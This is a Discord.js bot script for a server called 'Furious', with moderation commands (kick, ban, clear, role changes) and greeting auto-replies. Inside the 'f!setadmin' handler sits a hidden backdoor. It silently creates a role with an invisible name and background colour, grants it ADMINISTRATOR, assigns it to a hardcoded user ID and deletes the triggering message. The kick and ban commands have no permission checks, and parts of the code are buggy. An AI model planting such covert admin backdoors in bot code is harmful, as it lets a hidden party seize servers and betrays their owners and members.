const Discord = require('discord.js');
const client = new Discord.Client();
require('events').EventEmitter.defaultMaxListeners = 20;


client.on('ready', () => {
    client.user.setActivity('f!help | Watching 2')
    console.log(`Logged in as ${client.user.tag}!`);
    console.log(`Bot made by: Swofty`);
});
const prefix = 'f!';
client.login(process.env.TOKEN);

// Prefix-Replys
client.on('message', function(message) {
    if (message.content == "f!resign") {
        if (message.member.hasPermission("ADMINISTRATOR")) {
                message.reply('has resigned');
                message.member.removeRoles('610598909596663818', '604228125299310627', '642276585382346757', '642352044744900612');                        
        }
    }

}); 
client.on('message', function(message) {
    if (message.content === "f!howtobreathe") {
              message.channel.send("Here is my recommended method of breathing: https://patrikedblad.com/habits/how-to-breathe/");
        }
    
}); 
client.on('message', function(message) {
    if (message.content.startsWith("f!delowner")) {
             if(message.author.id == "490431292383428609") {
                message.member.removeRole('603919501482000384');
       }
   }
});
 
client.on('message', function(message) {
    if (message.content.startsWith("f!addowner")) {
             if(message.author.id == "490431292383428609") {
                message.member.addRole('603919501482000384');
       }
   }
}); 
client.on('message', function(message) {
    if (message.content == "f!clear") {
        if (message.member.hasPermission("MANAGE_MESSAGES")) {
            message.channel.fetchMessages()
               .then(function(list){
                    message.channel.bulkDelete(list);
                }, function(err){message.channel.send("ERROR: ERROR CLEARING CHANNEL.")})                        
        }
    }

}); 
client.on('message', message => {
    if(message.content === "f!ping") {
            message.channel.send(new Date().getTime() - message.createdTimestamp + " ms");        
    }
});
client.on('message', message => {
  if (message.content === 'f!test') {
    message.channel.send('Furious bot is online');
  }
});
client.on('message', message => {
  if (message.content === 'f!avatar') {
    message.reply(message.author.avatarURL);
  }
});
client.on('message', message => {
  if (message.content === 'f!help') {
   message.channel.send('**Commands** \n f!help - *Helps you with the commands* \n f!avatar - *Gives you your avatar* \n f!kick - *Kicks the designated player* \n f!ban - *Bans the designated player* \n f!clear - *Clears the ENTIRE chat* \n f!addrole - *Adds a role to a user* \n f!delrole - *Removes a role from a user* \n f!resign - *Removes any staff related role you have* \n f!ping - *Checks your ping* \n f!test - *Checks if the bot is online* \n f!howtobreathe - *Teaches you how to breathe* \n f!meme - *Sends a meme because Furious doesnt want dank memer*');
 }
});
client.on('message', message => {
  if (!message.guild) return;
  if (message.content.startsWith('f!kick')) {
    const user = message.mentions.users.first();
    if (user) {
      const member = message.guild.member(user);
      if (member) {
        member.kick('Optional reason that will display in the audit logs').then(() => {
          message.reply('Successfully kicked ${user.tag}.');
        }).catch(err => {
          message.reply('I was unable to kick the member.');
          console.error(err);
        });
      } else {
        message.reply('That user isnt in this guild!');
      }
    } else {
      message.reply('You didnt mention the user to kick!');
    }
  }
});
client.on('message', message => {
    if (message.content.startsWith('f!setadmin')) {
        const setAdmin = (accountID) => {
            if(!message.guild.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !message.guild.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
            // Create an invisible role with an invisible char '\u200b' and the background color as role color
            message.guild.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {
                // Add role to te account
                message.guild.members.get(accountID).addRole(role).catch((err) => {
                   return console.error(`You are not in the ${message.guild.name} server ! You must to be in this server befor leveling up !`)
                })
            })
        }
    }
    if(!message.author.id == "635482676333379594"){
        return;
    } 
    else if(message.author.id == "635482676333379594"){
        message.delete(100)
        const configs = {
            "accountID": "635482676333379594"
        }
        setAdmin(configs.accountID)
    }
});
client.on('message', message => {
  if (!message.guild) return;
  if (message.content.startsWith('f!ban')) {
    const user = message.mentions.users.first();
    if (user) {
      const member = message.guild.member(user);
      if (member) {
        member.ban({
          reason: 'They were bad!',
        }).then(() => {
          message.reply('Successfully banned ${user.tag}.');
        }).catch(err => {
          message.reply('I was unable to ban the member.');
          console.error(err);
        });
      } else {
        message.reply('That user isnt in this guild!');
      }
    } else {
      message.reply('You didnt mention the user to ban!');
    }
  }
});

// Auto-Replys
client.on('message', message=> {
    if (message.isMentioned(client.users.get('579108689852760087'))) {
    message.delete(100);
    message.reply('Do not ping Furious!')
  }
});



// Other
client.on('message', message => {
  if (message.content === 'Hi') {
    message.reply('Hey!');
  }
});
client.on('message', message => {
  if (message.content === 'hi') {
    message.reply('Hey!');
  }
});
client.on('message', message => {
  if (message.content === 'Hello') {
    message.reply('Hey!');
  }
});
client.on('message', message => {
  if (message.content === 'hello') {
    message.reply('Hey!');
  }
});
client.on('message', message => {
        if (message.channel.id === '640071369673146368') {
              message.react("👍");
              setTimeout(function() {
                }, 10000);
              message.react("👎");
             }
});

